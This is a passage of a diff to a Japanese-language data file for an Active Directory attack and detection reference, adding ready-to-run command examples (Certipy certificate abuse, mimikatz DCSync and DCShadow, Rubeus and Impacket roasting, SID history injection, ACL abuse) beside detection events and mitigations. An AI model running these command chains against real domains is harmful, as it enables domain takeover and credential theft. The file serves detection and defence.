     "detect": "5136でservicePrincipalName属性の追加(特に個人ユーザーへのSPN付与)を監視。4769でRC4(暗号種別0x17)のTGS要求急増やハニーSPNへのアクセスを検知。SPN追加→即4769→削除のパターンを相関する。",
     "events": "5136, 4769, 4738",
     "mitigate": "サービスアカウントはgMSA/25文字以上ランダムパスワードに。servicePrincipalName書込委任を排除。RC4を無効化(AES強制)しKerberoast耐性を上げ、ハニーSPNアカウントで検知する。",
@@ -3137,6 +5188,33 @@ AD.I18N.ja.attacks = [
     "summary": "標的のuserAccountControlにDONT_REQ_PREAUTHを立てKerberos事前認証を無効化、AS-REPをオフライン解読。",
     "how": "標的ユーザーへGenericWrite/GenericAll/WriteProperty(userAccountControl)またはWriteAccountRestrictionsを持つ主体がDONT_REQ_PREAUTH(0x400000)フラグを設定する。事前認証なしでAS-REPを取得しRC4部分をHashcatで解読、後にフラグを戻す。WriteAccountRestrictionsではRBCD用属性も書換可能。",
     "tools": "PowerView (Set-DomainObject userAccountControl), Rubeus (asreproast), impacket GetNPUsers.py, Hashcat",
+    "cmd": [
+      {
+        "tool": "bloodyAD",
+        "t": "userAccountControlにDONT_REQ_PREAUTHビットを付与し事前認証を無効化。`add uac`と`-f DONT_REQ_PREAUTH`がそのまま検知文字列、LDAP側は5136に残る",
+        "q": "bloodyAD -H dc01.corp.local -d corp.local -u attacker -p 'Passw0rd!' add uac svc_user -f DONT_REQ_PREAUTH"
+      },
+      {
+        "tool": "PowerView",
+        "t": "同じUACビット(0x400000=4194304)をXOR演算で付与。ファイルを介さず4104のスクリプトブロックに関数名が残る",
+        "q": "Set-DomainObject -Identity svc_user -XOR @{useraccountcontrol=4194304}"
+      },
+      {
+        "tool": "Rubeus",
+        "t": "事前認証なしAS-REPを要求しhashcat形式で出力。`asreproast`と`/format:hashcat`が最も残りやすい文字列",
+        "q": "Rubeus.exe asreproast /user:svc_user /format:hashcat /outfile:hashes.txt"
+      },
+      {
+        "tool": "Impacket",
+        "t": "Linux側から対象ユーザーのAS-REPを直接取得。端末側プロセスログは残らずDCの4768(事前認証なし)で見るしかない",
+        "q": "GetNPUsers.py corp.local/svc_user -no-pass -dc-ip 10.0.0.10 -outputfile hashes.txt"
+      },
+      {
+        "tool": "Hashcat",
+        "t": "持ち出し後のオフライン解読。モード18200=AS-REP(RC4/etype23)、出現自体がAS-REP Roast成立の裏付け",
+        "q": "hashcat -m 18200 -a 0 hashes.txt rockyou.txt -r best64.rule"
+      }
+    ],
     "detect": "5136でuserAccountControl変更(DONT_REQ_PREAUTHビット)を監視。4738(アカウント変更、事前認証不要化)を検知。4768で事前認証なし(PreAuthType=0)のAS-REQを相関する。",
     "events": "5136, 4738, 4768",
     "mitigate": "userAccountControl書込委任を排除。DONT_REQ_PREAUTHアカウントを定期棚卸しし恒久設定を排除。AES強制で解読難度を上げ、強パスワードを徹底する。",
@@ -3177,6 +5255,23 @@ AD.I18N.ja.attacks = [
     "summary": "GetChanges + GetChangesInFilteredSet(GetChangesAll無し)の権限組合せでディレクトリ複製(DirSync)経由にLAPSパスワードを同期取得。",
     "how": "DS-Replication-Get-ChangesとDS-Replication-Get-Changes-In-Filtered-Setを併せ持つ主体が、DirSync(DRSUAPI複製)でRODCフィルタ属性=機密属性であるLAPSパスワード(レガシーms-Mcs-AdmPwd/Windows LAPSのmsLAPS-EncryptedPassword)を複製取得する。フィルタ属性の複製にはGetChangesInFilteredSetが必須。GetChangesAllは持たない(持てば全資格情報のDCSync=T1003.006が可能)。BloodHound CEのSyncLAPSPasswordエッジで表現され、DCSyncに近い経路でローカル管理者資格を得る。",
     "tools": "impacket secretsdump.py(-just-dc系), PowerView, BloodHound (SyncLAPSPasswordエッジ)",
+    "cmd": [
+      {
+        "tool": "PowerShell",
+        "t": "DirSync複製で特定コンピュータのLAPSパスワードのみ同期取得。`Sync-LAPS`実行自体が4104に残る",
+        "q": "Sync-LAPS -LDAPFilter '(samaccountname=ws01$)'"
+      },
+      {
+        "tool": "PowerShell",
+        "t": "フィルタ無指定で全LAPS対象コンピュータを一括複製取得。DC側はDCSyncと同じ複製RPCとして4662に現れる",
+        "q": "Sync-LAPS -Server dc01.corp.local -Username svc_user -Password 'Passw0rd!' -Domain corp.local"
+      },
+      {
+        "tool": "PowerView",
+        "t": "GetChangesAllを持たない狭い権限セットをドメインルートへ自己付与する準備段階。`-RightsGUID`のACE追加が5136に残る",
+        "q": "Add-DomainObjectAcl -TargetIdentity 'DC=corp,DC=local' -PrincipalIdentity svc_user -RightsGUID '89e95b76-444d-4c62-991a-0facbeda640c'"
+      }
+    ],
     "detect": "4662でレプリケーション権限行使とLAPS属性アクセスの組合せを監視。非DCからの複製やLAPS属性の一括取得を検知する。",
     "events": "4662",
     "mitigate": "複製権限とLAPS読取権の重複付与を排除。非DCへの複製権限を剥奪。LAPS属性アクセスを監査する。",
@@ -3217,6 +5312,28 @@ AD.I18N.ja.attacks = [
     "summary": "証明書テンプレートオブジェクトへの書込権で脆弱設定(ENROLLEE_SUPPLIES_SUBJECT等)へ改変しESC1化。",
     "how": "pKICertificateTemplateオブジェクトにWriteDacl/GenericWrite/GenericAll/WriteOwnerを持つ主体が、テンプレートにmspki-certificate-name-flag(SubjectAltName任意指定)やClient Authentication EKU、低い発行要件を書き込みESC1相当に改変する。改変後Administratorとして証明書を要求しPKINITでドメイン管理者になりすます。使用後に元設定へ戻す。",
     "tools": "Certipy (template edit/relback), PowerView, ADSIEdit, Certify, ntlmrelayx",
+    "cmd": [
+      {
+        "tool": "Certipy",
+        "t": "脆弱なデフォルト設定(ENROLLEE_SUPPLIES_SUBJECT等)をテンプレートへ書込みESC1化。`-write-default-configuration`が決定的シグナル",
+        "q": "certipy template -u john@corp.local -p 'Passw0rd!' -template ESC4-Template -save-old -write-default-configuration -dc-ip 10.0.0.10"
+      },
+      {
+        "tool": "PowerView",
+        "t": "テンプレートDNへGenericAllを自己付与しCertipy等での改変準備。ACE追加がテンプレートオブジェクトの5136に残る",
+        "q": "Add-DomainObjectAcl -TargetIdentity 'CN=ESC4-Template,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local' -PrincipalIdentity svc_user -Rights All"
+      },
+      {
+        "tool": "Certipy",
+        "t": "ESC1相当に改変したテンプレートでAdministratorへなりすまし証明書要求。`-upn`によるSAN任意指定が痕跡",
+        "q": "certipy req -u john@corp.local -p 'Passw0rd!' -ca corp-CA -template ESC4-Template -upn administrator@corp.local -dc-ip 10.0.0.10"
+      },
+      {
+        "tool": "Certipy",
+        "t": "悪用後に元設定へ復元し痕跡を消去する後片付け操作。`-configuration`とJSONバックアップファイル名が手掛かり",
+        "q": "certipy template -u john@corp.local -p 'Passw0rd!' -template ESC4-Template -configuration ESC4-Template.json"
+      }
+    ],
     "detect": "5136でpKICertificateTemplateオブジェクトの属性変更(msPKI-Certificate-Name-Flag, msPKI-Enrollment-Flag, pKIExtendedKeyUsage, nTSecurityDescriptor)を監視。AD CS発行ログ(4886/4887)で異常なSAN指定要求を相関する。",
     "events": "5136, 4886, 4887, 4899(テンプレート更新)",
     "mitigate": "証明書テンプレートのACLを最小化しTier0のみ編集可に。テンプレート変更を監査・アラート化。CA発行にマネージャ承認を必須化しSAN任意指定を無効化する。",
@@ -3252,6 +5369,33 @@ AD.I18N.ja.attacks = [
     "summary": "CA自体へのManageCA/ManageCertificates権限で、脆弱テンプレート有効化や失敗要求の承認を通じ証明書発行を悪用。",
     "how": "CAオブジェクト/サービスへManageCA(CA管理者)権を持つ主体はSubjectAltName拡張(EDITF_ATTRIBUTESUBJECTALTNAME2)を有効化しESC6化、またはManageCertificates(証明書マネージャ)権で保留/失敗した証明書要求を承認する。これにより任意SANの証明書を入手しドメイン管理者へ昇格する。",
     "tools": "Certipy (ca -add-officer/-enable-template/-issue), PSPKI, Certify",
+    "cmd": [
+      {
+        "tool": "Certipy",
+        "t": "ManageCA権限で自身をCertificate Officer(証明書マネージャ)へ追加。`-add-officer`が決定的シグナル",
+        "q": "certipy ca -u raj@corp.local -p 'Passw0rd!' -ca corp-CA -add-officer svc_user -dc-ip 10.0.0.10"
+      },
+      {
+        "tool": "Certipy",
+        "t": "通常無効化されているSubCA等の危険テンプレートを有効化しESC1条件を満たす。`-enable-template`が痕跡",
+        "q": "certipy ca -u raj@corp.local -p 'Passw0rd!' -ca corp-CA -enable-template SubCA -dc-ip 10.0.0.10"
+      },
+      {
+        "tool": "Certipy",
+        "t": "一旦拒否させる証明書要求を送りRequest IDを取得。SAN任意指定というESC1相当の要求パターンが痕跡",
+        "q": "certipy req -u svc_user@corp.local -p 'Passw0rd!' -ca corp-CA -target dc01.corp.local -template SubCA -upn administrator@corp.local -dc-ip 10.0.0.10"
+      },
+      {
+        "tool": "Certipy",
+        "t": "ManageCertificates権限で保留中の要求を強制承認。`-issue-request`とRequest ID指定は他の操作と混同しない唯一無二の痕跡",
+        "q": "certipy ca -u raj@corp.local -p 'Passw0rd!' -ca corp-CA -issue-request 17 -dc-ip 10.0.0.10"
+      },
+      {
+        "tool": "Certipy",
+        "t": "承認済み証明書を回収しドメイン管理者へなりすます最終段階。`-retrieve`とRequest IDの一致がESC7完遂の証跡",
+        "q": "certipy req -u svc_user@corp.local -p 'Passw0rd!' -ca corp-CA -target dc01.corp.local -template SubCA -retrieve 17 -dc-ip 10.0.0.10"
+      }
+    ],
     "detect": "CA構成変更(EDITF_ATTRIBUTESUBJECTALTNAME2)や証明書マネージャ承認の異常を監視。4890/4882(CA権限/構成変更)と、同一Request IDでの4888(要求拒否)→4887(発行)や4889(保留)→4887を相関し、不審な強制承認を検知する(4885=監査フィルタ変更は承認イベントではない)。",
     "events": "4882, 4887(発行), 4888(要求拒否), 4889(要求保留), 4890, 4885(監査フィルタ変更=改ざん指標)",
     "mitigate": "CAのManageCA/ManageCertificates権限を厳格管理しTier0限定。EDITF_ATTRIBUTESUBJECTALTNAME2を無効化。CA構成・発行の監査を有効化し証明書マネージャ承認を最小化する。",
@@ -3287,6 +5431,28 @@ AD.I18N.ja.attacks = [
     "summary": "OU/コンテナへの書込権で継承ACEを設定し配下全オブジェクトを制御、または子オブジェクトを直接操作。",
     "how": "OU/コンテナにWriteDacl/GenericAllを持つ主体が、継承可能ACE(CONTAINER_INHERIT)を追加して配下の全ユーザー/コンピュータへGenericAllを伝播させる。あるいはgPLink書換やLAPS属性委任と組み合わせ配下端末を掌握する。委任構造の設定ミスで広範な影響を持つ。",
     "tools": "PowerView (Add-DomainObjectAcl -Inheritance), impacket dacledit.py, BloodHound",
+    "cmd": [
+      {
+        "tool": "Impacket",
+        "t": "OUへ継承可能なFullControl ACEを追加し配下オブジェクトへ伝播。`-inheritance`が子孫への継承指定の痕跡、DCにプロセスログは残らずLDAPの5136で見る",
+        "q": "dacledit.py -action write -rights FullControl -principal svc_user -target-dn 'OU=Workstations,DC=corp,DC=local' -inheritance corp.local/attacker:'Passw0rd!' -dc-ip 10.0.0.10"
+      },
+      {
+        "tool": "dsacls.exe",
+        "t": "OS標準LOLBinでOU配下へGenericAllを継承付与。`/I:S`(サブオブジェクトのみ継承)と`/G`が主要token、正規運用のACL変更と重なるため単体では低確度",
+        "q": "dsacls.exe \"OU=Workstations,DC=corp,DC=local\" /I:S /G corp\\svc_user:GA"
+      },
+      {
+        "tool": "PowerView",
+        "t": "PowerShell内でOUへGenericAllを付与。4104のスクリプトブロックに`Add-DomainObjectAcl`が残る",
+        "q": "Add-DomainObjectAcl -TargetIdentity 'OU=Workstations,DC=corp,DC=local' -PrincipalIdentity svc_user -Rights All"
+      },
+      {
+        "tool": "ldapmodify",
+        "t": "生LDAPでのDACL書換。ldifの中身自体はログに残らず`ldapmodify`実行後のOU配下アクセス急増との相関で見る",
+        "q": "ldapmodify -x -D 'attacker@corp.local' -w 'Passw0rd!' -h dc01.corp.local -f ou_dacl.ldif"
+      }
+    ],
     "detect": "5136でOU/コンテナのnTSecurityDescriptor変更、特に継承ACE追加を監視。配下オブジェクトへ想定外の継承権限が伝播していないか定期スキャンする。",
     "events": "5136, 4662",
     "mitigate": "OU委任を最小権限で設計しWriteDaclを排除。継承ACEを定期棚卸し。Tier0を含むOU構造のACLをベースライン管理し逸脱を検知する。",
@@ -3317,6 +5483,28 @@ AD.I18N.ja.attacks = [
     "summary": "ユーザーのscriptPath(またはprofilePath)属性書換でログオン時に任意スクリプトを実行させる。",
     "how": "ユーザーへGenericWrite/GenericAllを持つ主体がscriptPath属性を攻撃者制御のスクリプト(NETLOGON上等)に書き換える。標的が次にログオンした際にそのコンテキストでコードが実行される。profilePath/homeDirectoryのUNC書換でNTLM強制認証(coerce)にも利用される。",
     "tools": "PowerView (Set-DomainObject scriptPath), ADSIEdit, ntlmrelayx(強制認証連携)",
+    "cmd": [
+      {
+        "tool": "PowerView",
+        "t": "scriptPath属性をNETLOGON上の攻撃者スクリプトへ書換え。次回ログオン時に対象コンテキストで実行、5136のscriptPath変更が痕跡",
+        "q": "Set-DomainObject -Identity svc_user -Set @{scriptpath='\\\\corp.local\\netlogon\\payload.bat'}"
+      },
+      {
+        "tool": "PowerShell",
+        "t": "正規ADモジュールでの書換のため実行ファイル検知が効かない。4104に`Set-ADUser`呼出しとscriptpathの値が残る",
+        "q": "Set-ADUser -Identity svc_user -ScriptPath '\\\\corp.local\\netlogon\\payload.bat'"
+      },
+      {
+        "tool": "PowerView",
+        "t": "profilePathをUNCで攻撃者共有へ書換えログオン時のNTLM強制認証(coerce)に悪用。SMB接続元へのログオン試行が4624/5145に現れる",
+        "q": "Set-DomainObject -Identity svc_user -Set @{profilepath='\\\\attacker-host\\share\\'}"
+      },
+      {
+        "tool": "bloodyAD",
+        "t": "Linux側から属性を直接上書き。エンドポイントの実行ログは残らずLDAPの5136(scriptPath変更)のみが手掛かり",
+        "q": "bloodyAD -H dc01.corp.local -d corp.local -u attacker -p 'Passw0rd!' set object svc_user scriptPath -v '\\\\corp.local\\netlogon\\payload.bat'"
+      }
+    ],
     "detect": "5136でscriptPath/profilePath/homeDirectory属性変更を監視。NETLOGON/SYSVOL上の不審スクリプト追加をFIMで検知。ログオン後の異常プロセス(4688)を相関する。",
     "events": "5136, 4688, 5145",
     "mitigate": "ユーザーオブジェクトへのGenericWrite委任を排除。scriptPath変更を監査。ログオンスクリプト格納先をFIM保護し実行を制限する。",
@@ -3357,6 +5545,33 @@ AD.I18N.ja.attacks = [
     "summary": "対象への全拡張権限。ForceChangePassword・DCSync・LAPS/gMSA読取など各拡張操作を包括的に実行可能。",
     "how": "AllExtendedRightsを持つ主体は対象に応じForceChangePassword(ユーザー)、DS-Replication-Get-Changes系(ドメイン=DCSync)、LAPS/gMSAパスワード読取など該当する拡張権限を全て行使できる。BloodHoundのAllExtendedRightsエッジとして表示され対象別に最適な後続攻撃へ分岐する。",
     "tools": "PowerView, impacket (secretsdump.py, changepasswd.py), mimikatz, BloodHound",
+    "cmd": [
+      {
+        "tool": "PowerView",
+        "t": "ForceChangePassword拡張権限で対象のパスワードを強制変更。4724(パスワードリセット)の実行者と対象アカウントの乖離で識別できる",
+        "q": "Set-DomainUserPassword -Identity svc_user -AccountPassword (ConvertTo-SecureString 'Passw0rd!' -AsPlainText -Force)"
+      },
+      {
+        "tool": "Impacket",
+        "t": "SAMR/RPC経由でリモートからパスワードリセット。`-reset`と`-altuser`の組合せが特権行使の直接証跡",
+        "q": "changepasswd.py corp.local/svc_user@10.0.0.10 -newpass 'NewPassw0rd!' -altuser corp.local/attacker -altpass 'Passw0rd!' -reset"
+      },
+      {
+        "tool": "bloodyAD",
+        "t": "ドメインルートでのAllExtendedRightsからDCSync系拡張権限を自身へ付与。`add dcsync`実行後の複製RPCが4662と相関する",
+        "q": "bloodyAD -H dc01.corp.local -d corp.local -u attacker -p 'Passw0rd!' add dcsync attacker"
+      },
+      {
+        "tool": "Mimikatz",
+        "t": "ドメインルートに及ぶAllExtendedRightsでのDCSync実行。決定的シグナルの`lsadump::dcsync`",
+        "q": "mimikatz.exe \"lsadump::dcsync /domain:corp.local /user:krbtgt\" exit"
+      },
+      {
+        "tool": "Impacket",
+        "t": "同じくDCSync系拡張権限をリモートから行使しNTDS相当を抽出。DCにプロセスログは残らず4662のレプリケーション権限GUIDのみが手掛かり",
+        "q": "secretsdump.py -just-dc corp.local/attacker@10.0.0.10"
+      }
+    ],
     "detect": "4662で対象GUIDに応じた拡張権限行使を監視。AllExtendedRights ACEを持つ主体を棚卸しし、ForceChangePassword(4724)や複製(4662)など後続イベントを相関する。",
     "events": "4662, 4724",
     "mitigate": "AllExtendedRights ACEを削除し個別最小権限に置換。機微オブジェクト(ドメイン/DC/保護アカウント)への付与を排除し定期監査する。",
@@ -3397,6 +5612,23 @@ AD.I18N.ja.attacks = [
     "summary": "高権限ACL(ドメイン/Configurationへの複製・書込権)で一時的に偽DCを登録し、任意オブジェクト属性を複製経由で改ざん。",
     "how": "ドメイン/Configurationパーティションに対する複製権限とオブジェクト作成権(DS-Install-Replica等)を持つ主体が、自ホストを一時的にDCとして登録しsidHistoryやprimaryGroupID、ACL等を複製プッシュで書き換える。通常の変更ログを回避しやすくステルスな永続化・権限昇格に使われる。",
     "tools": "mimikatz (lsadump::dcshadow /push), impacket(一部)",
+    "cmd": [
+      {
+        "tool": "Mimikatz",
+        "t": "偽DCとして自ホストを一時登録し書換対象の属性値を予約。`dcshadow`という文字列自体が高確度シグナル",
+        "q": "mimikatz.exe \"lsadump::dcshadow /object:CN=target,CN=Users,DC=corp,DC=local /attribute=primaryGroupID /value=512\" exit"
+      },
+      {
+        "tool": "Mimikatz",
+        "t": "別セッションの特権プロセスから複製をプッシュし実際に書込む。通常の複製とは異なる送信元DCとして複製関連イベントに現れうる",
+        "q": "mimikatz.exe \"lsadump::dcshadow /push\" exit"
+      },
+      {
+        "tool": "Mimikatz",
+        "t": "member等セキュリティに直結する任意属性も書換可能な例。通常のグループ変更監査(4728/4756)を経由せず反映される",
+        "q": "mimikatz.exe \"lsadump::dcshadow /object:CN=Domain Admins,CN=Users,DC=corp,DC=local /attribute=member /value=CN=svc_user,CN=Users,DC=corp,DC=local\" exit"
+      }
+    ],
     "detect": "Configurationパーティションへの一時的なnTDSDSA/server オブジェクト作成・削除(5137/5141)を監視。想定外ホストからの複製(4662)や短命なDC登録を検知する。",
     "events": "4662, 5137, 5141, 4928/4929",
     "mitigate": "複製・Configuration書込権をDC/Enterprise Adminsに限定。DC登録の異常をアラート化。Tier0権限を厳格管理しDCShadow前提権限を排除する。",
@@ -3437,6 +5669,23 @@ AD.I18N.ja.attacks = [
     "summary": "sIDHistory属性への書込(通常はDCShadow/複製経由)で特権グループSIDを注入しトークンに継承させる。",
     "how": "通常はLSA/複製権限が必要だが、DCShadowや複製書込権を持つ主体が標的アカウントのsIDHistoryにDomain Admins(RID 512)等のSIDを注入する。ログオン時にそのSIDがトークンに含まれ、グループメンバーでなくとも特権が付与される永続化手法。",
     "tools": "mimikatz (sid::add, lsadump::dcshadow), DSInternals (Add-ADDBSidHistory)",
+    "cmd": [
+      {
+        "tool": "Mimikatz",
+        "t": "sIDHistoryへDomain AdminsのSIDを直接注入。`sid::add` という文字列とDsAddSidHistory RPC呼出しが痕跡（旧`misc::addsid`は現行版では無効化済み）",
+        "q": "mimikatz.exe \"sid::add /sam:svc_user /new:S-1-5-21-1111111111-2222222222-3333333333-512\" exit"
+      },
+      {
+        "tool": "Mimikatz",
+        "t": "通常必要な移行監査やSIDフィルタリングを回避するためDCShadowで直接属性書換。`dcshadow`と`sIDHistory`の組合せが高確度",
+        "q": "mimikatz.exe \"lsadump::dcshadow /object:CN=svc_user,CN=Users,DC=corp,DC=local /attribute=sIDHistory /value=S-1-5-21-1111111111-2222222222-3333333333-512\" exit"
+      },
+      {
+        "tool": "DSInternals",
+        "t": "持ち出したntds.ditのオフラインコピーへ直接注入するためDC上の実行ログには現れない。ファイルアクセス監査と持ち出し経路で見る",
+        "q": "Add-ADDBSidHistory -SamAccountName 'svc_user' -SidHistory 'S-1-5-21-1111111111-2222222222-3333333333-512' -DatabasePath 'C:\\Windows\\NTDS\\ntds.dit'"
+      }
+    ],
     "detect": "5136でsIDHistory属性変更を監視。sIDHistoryに特権RID(512等)を持つ異常アカウントを定期スキャン。DCShadow痕跡(5137/5141)を相関する。",
     "events": "5136, 4765/4766(SID History追加/失敗)",
     "mitigate": "sIDHistoryを持つアカウントを棚卸しし不要分を削除。SIDフィルタリングを有効化。移行完了後はsIDHistoryをクリアし複製権限を厳格管理する。",
@@ -3472,6 +5721,33 @@ AD.I18N.ja.attacks = [
     "summary": "テンプレートがClient Authentication EKUを持ち、かつ申請者がSubject Alternative Name(SAN)を任意指定できる設定のとき、任意ユーザー(Domain Admin等)のUPNを埋め込んだ証明書を発行させて成りすます。",
     "how": "前提: テンプレートが CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT(msPKI-Certificate-Name-Flag) を持ち、Client Auth/PKINIT/Smartcard Logon/Any Purpose のいずれかのEKUを含み、低権限ユーザーにEnroll権限があり、マネージャ承認が不要であること。手順は Certipy find -vulnerable でESC1テンプレートを特定し、certipy req -ca <CA> -template <tmpl> -upn administrator@domain.local でSANにDA UPNを指定して発行、得たPFXで certipy auth -pfx admin.pfx を実行しTGT/NTハッシュを取得する。",
     "tools": "Certipy (find/req/auth), Certify.exe request /altname, Rubeus asktgt /certificate, openssl",
+    "cmd": [
+      {
+        "tool": "Certipy",
+        "t": "脆弱テンプレートを一括判定。Linux実行のため端末ログは残らずLDAP検索と直後の4768/4769相関で見る",
+        "q": "certipy find -u svc_user@corp.local -p 'Passw0rd!' -dc-ip 10.0.0.10 -vulnerable -stdout"
+      },
+      {
+        "tool": "Certipy",
+        "t": "SANにDA UPNを指定し証明書を発行させる。`-upn`値が申請者本人と一致しない点がCA側4886の異常",
+        "q": "certipy req -u svc_user@corp.local -p 'Passw0rd!' -ca corp-CA -target ca01.corp.local -template ESC1-Template -upn administrator@corp.local"
+      },
+      {
+        "tool": "Certipy",
+        "t": "取得PFXで認証しTGT/NTハッシュを取得。DC側4768のPreAuthタイプがPKINIT(証明書認証)になる",
+        "q": "certipy auth -pfx administrator.pfx -dc-ip 10.0.0.10"
+      },
+      {
+        "tool": "Certify.exe",
+        "t": "Windows側の代替ツール。プロセスコマンドラインに`/altname:`と対象UPNがそのまま残る",
+        "q": "Certify.exe request /ca:ca01.corp.local\\corp-CA /template:ESC1-Template /altname:administrator@corp.local"
+      },
+      {
+        "tool": "Rubeus",
+        "t": "取得PFXから直接TGTを要求しSSPIへ注入。`/certificate:`と`/ptt`の組合せが相関の要",
+        "q": "Rubeus.exe asktgt /user:administrator /certificate:administrator.pfx /password:'Passw0rd!' /ptt"
+      }
+    ],
     "detect": "CA上のイベント4886(証明書要求)/4887(証明書発行)で、Subject名と要求者アカウントが一致しない(要求者が低権限なのにSANにadministratorが入る)ケースを監視。要求元テンプレート名とSANのUPNドメイン照合を行う。PKINIT由来の4768(暗号化タイプ・Certificate Information欄)も相関する。",
     "events": "4886, 4887, 4768(PKINIT), 4624",
     "mitigate": "テンプレートから CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT を除去しSubjectをADから構築する設定に変更。Client Auth系EKUを持つテンプレートでは必ずマネージャ承認(CA Certificate Manager Approval)を有効化し、Enroll権限を最小化する。certipy find の脆弱性レポートで恒常的に棚卸しする。",
@@ -3512,6 +5788,28 @@ AD.I18N.ja.attacks = [
     "summary": "テンプレートのEKUが Any Purpose(2.5.29.37.0) もしくはEKU無し(SubCA相当)の場合、発行された証明書を任意用途(クライアント認証含む)に使えるため発行者本人への成りすまし(クライアント認証)や、Any Purpose EKUの場合はコード/文書署名に悪用できる(エンドエンティティ証明書はCA基本制約〔isCA=TRUE〕を持たず、新規証明書への署名はできない)。",
     "how": "前提: テンプレートに Any Purpose EKU またはEKUが空で低権限にEnroll権限がある。手順はESC1同様にテンプレートを申請するが、SAN指定が不可な場合でも証明書を認証・署名・任意用途に利用できる。SANが指定できるならESC1同様にUPN成りすまし、指定できなくても取得証明書を他攻撃(署名)に流用する。",
     "tools": "Certipy req, Certify request, Rubeus",
+    "cmd": [
+      {
+        "tool": "Certipy",
+        "t": "Any Purpose/EKU無しテンプレートを判定。`-vulnerable`出力のESC2ラベルが目印",
+        "q": "certipy find -u svc_user@corp.local -p 'Passw0rd!' -dc-ip 10.0.0.10 -vulnerable -stdout"
+      },
+      {
+        "tool": "Certipy",
+        "t": "SAN指定なしで発行者本人の万能証明書を取得。テンプレート名がAny Purpose EKU付与テンプレートと一致する点が手掛かり",
+        "q": "certipy req -u svc_user@corp.local -p 'Passw0rd!' -ca corp-CA -target ca01.corp.local -template AnyPurposeCert"
+      },
+      {
+        "tool": "Certipy",
+        "t": "取得証明書で本人として認証しTGT取得。署名/暗号等への転用は本来の用途と食い違い4886と相関する",
+        "q": "certipy auth -pfx svc_user.pfx -dc-ip 10.0.0.10"
+      },
+      {
+        "tool": "Certify.exe",
+        "t": "Windows側での同等リクエスト。`/template:`にAny Purpose EKU付与テンプレート名が残る",
+        "q": "Certify.exe request /ca:ca01.corp.local\\corp-CA /template:AnyPurposeCert"
+      }
+    ],
     "detect": "4886/4887でEKUがAny Purpose/空のテンプレートからの発行を検知。特に低権限アカウントによるSubCA・汎用テンプレート申請を異常として監視する。",
     "events": "4886, 4887",
     "mitigate": "テンプレートのEKUを業務に必要な最小限(例: Client Authentication のみ)へ限定し、Any Purpose/空EKUテンプレートのEnroll権限を撤去またはマネージャ承認を必須化する。",
@@ -3542,6 +5840,28 @@ AD.I18N.ja.attacks = [
     "summary": "Certificate Request Agent EKU(1.3.6.1.4.1.311.20.2.1)を持つテンプレートで登録代理証明書を取得し、その代理権で他ユーザー(DA等)の代理として証明書を発行し成りすます。",
     "how": "前提: Enrollment Agent EKUテンプレートに低権限Enroll権限があり、代理発行を許すテンプレートが存在する。手順は(1)certipy req でEnrollment Agent証明書を取得、(2)certipy req -template User -on-behalf-of 'domain\\administrator' -pfx agent.pfx で対象ユーザーの代理として証明書を発行、(3)certipy auth で認証。",
     "tools": "Certipy (req -on-behalf-of), Certify request /onbehalfof /enrollcert",
+    "cmd": [
+      {
+        "tool": "Certipy",
+        "t": "Enrollment Agent EKUテンプレートで登録代理証明書を取得。テンプレート名がCertificate Request Agent系である点が目印",
+        "q": "certipy req -u svc_user@corp.local -p 'Passw0rd!' -ca corp-CA -target ca01.corp.local -template EnrollmentAgent"
+      },
+      {
+        "tool": "Certipy",
+        "t": "代理証明書でDA名義の証明書を発行。`-on-behalf-of`の値が申請者アカウントと異なる非対称性が検知点",
+        "q": "certipy req -u svc_user@corp.local -p 'Passw0rd!' -ca corp-CA -target ca01.corp.local -template User -pfx agent.pfx -on-behalf-of 'corp\\administrator'"
+      },
+      {
+        "tool": "Certipy",
+        "t": "代理発行証明書で対象ユーザーとして認証。4768のPKINITと本来の申請者アカウントの乖離で追える",
+        "q": "certipy auth -pfx administrator.pfx -dc-ip 10.0.0.10"
+      },
+      {
+        "tool": "Certify.exe",
+        "t": "Windows側の代理発行。`/onbehalfof:`と`/enrollcert:`(取得済み代理証明書指定)がコマンドラインに残る",
+        "q": "Certify.exe request /ca:ca01.corp.local\\corp-CA /template:User /onbehalfof:\"corp\\administrator\" /enrollcert:agent.pfx /enrollcertpw:'Passw0rd!'"
+      }
+    ],
     "detect": "Enrollment Agent証明書の発行(4887)と、その後の代理発行(要求者と証明書Subjectが異なる4886/4887)を相関検知。代理発行は稀なため単独でも高シグナル。",
     "events": "4886, 4887",
     "mitigate": "Enrollment Agent EKUテンプレートの発行を厳格に制限し、CA側でEnrollment Agent Restrictions(誰が誰の代理を、どのテンプレートで発行可能か)を設定する。不要なEnrollment Agentテンプレートは削除する。",
@@ -3577,6 +5897,28 @@ AD.I18N.ja.attacks = [
     "summary": "証明書テンプレートオブジェクトに低権限ユーザーがWrite/WriteDacl/FullControl等を持つ場合、テンプレート設定をESC1相当に書き換えてから悪用する。",
     "how": "前提: テンプレートADオブジェクト(CN=...,CN=Certificate Templates,CN=Public Key Services)に WriteOwner/WriteDacl/WriteProperty 等の権限を持つ。手順は certipy template -template <tmpl> -write-default-configuration でESC1化(ENROLLEE_SUPPLIES_SUBJECT付与・EKUをClient Auth化・承認要件解除)し、ESC1同様に発行・認証、最後に元設定へ復元する。",
     "tools": "Certipy template (旧-save-old/-configuration), StandIn, PowerView Set-ADObject",
+    "cmd": [
+      {
+        "tool": "Certipy",
+        "t": "テンプレート設定をESC1相当へ書換え。`-write-default-configuration`実行がDC側4899/4900テンプレート変更イベントを生む",
+        "q": "certipy template -u svc_user@corp.local -p 'Passw0rd!' -dc-ip 10.0.0.10 -template VulnACL-Template -write-default-configuration"
+      },
+      {
+        "tool": "Certipy",
+        "t": "改変前設定をバックアップ。単体は無害だが直後の書換えとセットで復元シナリオとして相関させる",
+        "q": "certipy template -u svc_user@corp.local -p 'Passw0rd!' -dc-ip 10.0.0.10 -template VulnACL-Template -save-configuration original.json"
+      },
+      {
+        "tool": "Certipy",
+        "t": "書換え後はESC1と同一手順で成りすまし証明書を取得。4899/4900直後のSAN付きTGS要求が相関の鍵",
+        "q": "certipy req -u svc_user@corp.local -p 'Passw0rd!' -ca corp-CA -target ca01.corp.local -template VulnACL-Template -upn administrator@corp.local"
+      },
+      {
+        "tool": "PowerView",
+        "t": "PowerShellから直接msPKI-Certificate-Name-Flag等の属性を書換え。4104に属性名とテンプレートDNが残る",
+        "q": "Set-ADObject -Identity 'CN=VulnACL-Template,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local' -Replace @{'msPKI-Certificate-Name-Flag'=1}"
+      }
+    ],
